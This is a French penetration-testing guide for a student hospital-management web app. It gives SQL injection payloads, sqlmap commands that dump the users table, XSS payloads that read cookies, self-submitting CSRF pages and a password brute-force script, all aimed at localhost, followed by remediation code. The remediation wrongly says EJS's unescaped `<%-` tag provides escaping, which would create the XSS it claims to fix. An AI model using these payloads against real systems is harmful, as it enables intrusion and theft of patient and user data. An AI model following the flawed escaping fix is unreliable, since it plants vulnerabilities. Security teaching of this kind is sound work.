# Guide Pratique de Tests d'Intrusion

Ce document fournit des instructions détaillées pour réaliser des tests d'intrusion sur l'application de gestion hospitalière. Ces tests vous permettront de mettre en évidence les vulnérabilités identifiées dans le document VULNERABILITES.md et de comprendre comment les corriger.

## Table des Matières

1. [Configuration de l'Environnement](#configuration-de-lenvironnement)
2. [Déploiement avec TLS](#déploiement-avec-tls)
3. [Tests d'Injection SQL](#tests-dinjection-sql)
4. [Tests XSS](#tests-xss)
5. [Tests CSRF](#tests-csrf)
6. [Tests d'Authentification](#tests-dauthentification)
7. [Scanning Automatisé](#scanning-automatisé)
8. [Analyse des Résultats](#analyse-des-résultats)
9. [Remédiation](#remédiation)

## Configuration de l'Environnement

### Prérequis

- Node.js et npm
- MySQL
- Outils de test: OWASP ZAP, Burp Suite (version gratuite), SQLmap
- Firefox avec l'extension FoxyProxy
- Postman ou Insomnia

### Installation des Outils

#### OWASP ZAP
1. Téléchargez [OWASP ZAP](https://www.zaproxy.org/download/)
2. Installez et lancez l'application
3. Configurez Firefox pour utiliser ZAP comme proxy:
   - Installez FoxyProxy
   - Ajoutez un nouveau proxy sur 127.0.0.1:8080

#### SQLmap
```bash
# Pour Linux/macOS
pip install sqlmap

# Pour Windows
# Téléchargez depuis https://sqlmap.org/ et ajoutez au PATH
```

### Préparation de l'Application

1. Clonez le dépôt de l'application
2. Installez les dépendances
   ```bash
   npm install
   ```
3. Configurez la base de données
   ```bash
   mysql -u root -p < nodelogin.sql
   ```
4. Créez un fichier `.env` pour les variables d'environnement

## Déploiement avec TLS

### Méthode 1: Let's Encrypt (Production)

Pour un domaine réel:

```bash
# Installer Certbot
sudo apt-get update
sudo apt-get install certbot

# Obtenir un certificat
sudo certbot certonly --standalone -d votredomaine.com

# Vérifier les certificats
ls -l /etc/letsencrypt/live/votredomaine.com/
```

Puis modifiez `app.js` pour utiliser HTTPS:

```javascript
const https = require('https');
const fs = require('fs');

const privateKey = fs.readFileSync('/etc/letsencrypt/live/votredomaine.com/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/votredomaine.com/cert.pem', 'utf8');
const ca = fs.readFileSync('/etc/letsencrypt/live/votredomaine.com/chain.pem', 'utf8');

const credentials = {
    key: privateKey,
    cert: certificate,
    ca: ca
};

const httpsServer = https.createServer(credentials, app);
httpsServer.listen(443, () => {
    console.log('HTTPS Server running on port 443');
});
```

### Méthode 2: Certificat Auto-signé (Tests)

Pour le développement local:

```bash
# Générer une clé privée et un certificat
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ./selfsigned.key -out ./selfsigned.crt
```

Puis modifiez `app.js`:

```javascript
const https = require('https');
const fs = require('fs');

const privateKey = fs.readFileSync('selfsigned.key', 'utf8');
const certificate = fs.readFileSync('selfsigned.crt', 'utf8');

const credentials = {
    key: privateKey,
    cert: certificate
};

const httpsServer = https.createServer(credentials, app);
httpsServer.listen(443, () => {
    console.log('HTTPS Server running on port 443');
});
```

## Tests d'Injection SQL

### Test 1: Authentification Bypass

**Objectif**: Contourner l'authentification en utilisant une injection SQL.

**Procédure**:
1. Accédez à la page de connexion (`/login`)
2. Dans le champ "Username", entrez: `' OR '1'='1`
3. Dans le champ "Password", entrez n'importe quoi ou le même payload

**Résultat attendu**: Vous accédez au système sans connaître le mot de passe.

**Explication**: La requête SQL devient:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='xyz'
```
La condition `'1'='1'` est toujours vraie, donc la requête retourne tous les utilisateurs.

### Test 2: Extraction de Données avec UNION

**Objectif**: Extraire des données d'autres tables de la base de données.

**Procédure**:
1. Dans un champ de recherche de médicaments, entrez:
   ```
   ' UNION SELECT id, username, password, 'x', 'x', 'x' FROM users; --
   ```
   (Ajustez le nombre de colonnes selon le schéma exact)

**Résultat attendu**: Les résultats affichent à la fois des médicaments et des informations utilisateur.

### Test 3: Utilisation de SQLmap

SQLmap est un outil puissant pour tester automatiquement les injections SQL:

```bash
# Test de base sur le formulaire de connexion
sqlmap -u "http://localhost:3000/login" --data="username=test&password=test" -p username,password --dbs

# Extraction des tables
sqlmap -u "http://localhost:3000/login" --data="username=test&password=test" -p username --tables

# Extraction des données
sqlmap -u "http://localhost:3000/login" --data="username=test&password=test" -p username -D hospital_db -T users --dump
```

## Tests XSS

### Test 1: XSS Réfléchi (Reflected)

**Objectif**: Injecter un script qui s'exécute immédiatement quand la page est chargée.

**Procédure**:
1. Dans un champ de recherche, entrez:
   ```html
   <script>alert('XSS')</script>
   ```
2. Soumettez le formulaire et observez si une alerte apparaît

### Test 2: XSS Stocké (Stored)

**Objectif**: Injecter un script qui sera stocké dans la base de données et exécuté quand d'autres utilisateurs visitent la page.

**Procédure**:
1. Dans un champ de commentaire ou de message, entrez:
   ```html
   <script>alert(document.cookie)</script>
   ```
2. Soumettez le formulaire et vérifiez si le script s'exécute à chaque visite de la page

### Test 3: XSS DOM-Based

**Objectif**: Exploiter une vulnérabilité de manipulation DOM.

**Procédure**:
1. Si l'application utilise des paramètres dans l'URL qui sont insérés dynamiquement dans le DOM, essayez:
   ```
   http://localhost:3000/page?name=<img src="x" onerror="alert('XSS')">
   ```

### Remédiation XSS

Pour tester les solutions de remédiation:

1. Utilisez l'échappement automatique avec EJS: `<%- ... %>` au lieu de `<%= ... %>`
2. Implémentez une Content Security Policy:
   ```javascript
   app.use((req, res, next) => {
     res.setHeader('Content-Security-Policy', "default-src 'self'");
     next();
   });
   ```

## Tests CSRF

### Test 1: Formulaire Automatique

**Objectif**: Créer une page HTML qui soumet automatiquement un formulaire vers l'application cible.

**Procédure**:
1. Créez un fichier HTML contenant:
   ```html
   <html>
   <body onload="document.getElementById('csrf-form').submit()">
     <form id="csrf-form" action="http://localhost:3000/store/add_med" method="POST">
       <input type="hidden" name="name" value="Médicament Pirate">
       <input type="hidden" name="price" value="999">
       <input type="hidden" name="quantity" value="100">
     </form>
   </body>
   </html>
   ```
2. Ouvrez ce fichier dans un navigateur pendant que vous êtes connecté à l'application dans un autre onglet

**Résultat attendu**: Le formulaire se soumet automatiquement et ajoute un médicament sans votre intervention explicite.

### Test 2: CSRF avec XMLHttpRequest

```html
<html>
<body>
<script>
  function sendCSRF() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3000/appointment/add", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.withCredentials = true;
    xhr.send("patient=John&doctor=Smith&date=2023-12-25");
  }
  sendCSRF();
</script>
</body>
</html>
```

### Remédiation CSRF

Pour tester l'efficacité de la protection CSRF:

1. Installez csurf: `npm install csurf`
2. Implémentez le middleware:
   ```javascript
   const csrf = require('csurf');
   const csrfProtection = csrf({ cookie: true });
   
   app.use(csrfProtection);
   ```
3. Ajoutez le token CSRF à tous les formulaires:
   ```html
   <form action="/action" method="POST">
     <input type="hidden" name="_csrf" value="<%= csrfToken %>">
     <!-- autres champs -->
   </form>
   ```
4. Testez à nouveau avec les formulaires CSRF automatisés - ils devraient échouer maintenant

## Tests d'Authentification

### Test 1: Brute Force

**Objectif**: Tester la résistance aux attaques par force brute.

**Procédure**:
1. Créez un script (ou utilisez Burp Intruder) pour envoyer de multiples requêtes d'authentification
2. Utilisez une liste de mots de passe courants
3. Observez si l'application limite les tentatives ou verrouille le compte

**Script Python de base**:
```python
import requests

passwords = ['password', '123456', 'admin', 'welcome', 'password123']
url = 'http://localhost:3000/login'

for password in passwords:
    data = {
        'username': 'admin',
        'password': password
    }
    response = requests.post(url, data=data, allow_redirects=False)
    if response.status_code == 302:  # Redirect après succès
        print(f"Mot de passe trouvé: {password}")
        break
```

### Test 2: Énumération des Utilisateurs

**Objectif**: Vérifier si l'application divulgue l'existence d'utilisateurs.

**Procédure**:
1. Tentez de vous connecter avec différents noms d'utilisateur
2. Observez si les messages d'erreur diffèrent selon que l'utilisateur existe ou non

### Test 3: Sécurité des Cookies de Session

**Objectif**: Vérifier les attributs de sécurité des cookies.

**Procédure**:
1. Connectez-vous à l'application
2. Inspectez les cookies avec les outils de développement du navigateur
3. Vérifiez la présence des attributs HttpOnly, Secure, SameSite

## Scanning Automatisé

### OWASP ZAP

1. Lancez OWASP ZAP
2. Configurez le navigateur pour utiliser ZAP comme proxy (port 8080)
3. Effectuez un scan automatisé:
   - Allez dans Tools > Spider
   - Entrez l'URL de l'application
   - Lancez le scan
4. Analysez les alertes générées

### Commandes pour Nikto

```bash
# Scan de base
nikto -h localhost:3000

# Scan plus détaillé
nikto -h localhost:3000 -Tuning x
```

## Analyse des Résultats

Après avoir effectué les tests, créez un rapport structuré:

1. **Résumé Exécutif**
   - Vue d'ensemble des vulnérabilités trouvées
   - Évaluation globale du risque

2. **Vulnérabilités par Catégorie**
   - Liste détaillée de chaque vulnérabilité
   - Score CVSS pour chaque problème
   - Preuves (captures d'écran, exemples de code)

3. **Recommandations**
   - Solutions de remédiation prioritaires
   - Plan d'action à court et long terme

## Remédiation

Pour chaque type de vulnérabilité, implémentez les corrections et testez à nouveau:

### 1. Injection SQL

Remplacez:
```javascript
var query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
```

Par:
```javascript
var query = "SELECT * FROM users WHERE username = ? AND password = ?";
connection.query(query, [username, password], callback);
```

### 2. XSS

Remplacez dans les templates EJS:
```ejs
<div><%= userInput %></div>
```

Par:
```ejs
<div><%- userInput %></div>
```

Et ajoutez une sanitization:
```javascript
const sanitizeHtml = require('sanitize-html');
app.locals.sanitize = function(input) {
  return sanitizeHtml(input, {
    allowedTags: [],
    allowedAttributes: {}
  });
};
```

### 3. CSRF

Implémentez la protection CSRF:
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

// Dans les routes
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/process', csrfProtection, (req, res) => {
  // Traitement sécurisé
});
```

---

Ce guide vous permettra de tester méthodiquement les vulnérabilités de l'application et de comprendre comment les corriger. Utilisez-le comme complément au document VULNERABILITES.md pour votre projet académique de sécurité.